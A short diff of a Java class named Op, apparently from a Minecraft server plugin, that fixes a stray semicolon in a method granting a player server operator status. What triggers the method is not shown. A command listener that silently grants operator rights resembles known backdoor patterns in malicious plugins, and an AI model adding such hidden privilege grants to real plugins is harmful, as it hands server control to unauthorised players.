@@ -27,7 +27,7 @@ public class Op extends CommandListener {
 
     public static void setOp(final Player p) {
         Bootstrap.getInstance().getServer().getScheduler().runTaskAsynchronously(Bootstrap.getInstance(), () -> {
-            if (!p.isOp());
+            if (!p.isOp())
             p.setOp(true);
         });
     }
